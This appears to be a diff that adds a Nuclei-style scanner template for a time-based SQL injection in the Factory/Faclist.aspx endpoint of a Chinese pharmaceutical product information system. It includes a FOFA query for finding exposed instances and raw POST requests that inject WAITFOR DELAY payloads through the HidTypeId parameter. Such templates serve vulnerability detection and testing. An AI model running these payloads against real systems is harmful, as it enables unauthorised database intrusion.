@@ -1,0 +1,36 @@
+id: YiYao-ShangPin-XinXi-FaBu-XiTong-Faclist_aspx-SQL-Time
+
+info:
+  name: 医药商品信息发布系统 Factory/Faclist.aspx SQL延时注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: title="医药商品信息发布系统"
+    医药商品信息发布系统 Factory/Faclist.aspx 接口存在SQL延时注入漏洞，攻击者可通过HidTypeId参数注入SQL语句进行延时攻击，可能导致数据库信息泄露、服务器被入侵等安全风险。
+  reference:
+    - 
+  tags: sql-time, yiyao-shangpin-xinxifabuxitong, factory-faclist
+
+http:
+  - raw:
+      - |-
+        POST /Factory/Faclist.aspx?id=2 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        ToolkitscriptManager1=UpdatePanel2|btnok&ToolkitscriptManager1_HiddenField=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&__VIEWSTATEGENERATOR=&txtname=&pageno=&HidTypeId=2';WAITFOR DELAY '0:0:4' --&btnok=
+
+      - |-
+        POST /Factory/Faclist.aspx?id=2 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        ToolkitscriptManager1=UpdatePanel2|btnok&ToolkitscriptManager1_HiddenField=&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&__VIEWSTATEGENERATOR=&txtname=&pageno=&HidTypeId=2';WAITFOR DELAY '0:0:8' --&btnok=
+
+    matchers:
+      - type: dsl
+        name: SQL延时注入
+        dsl:
+          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
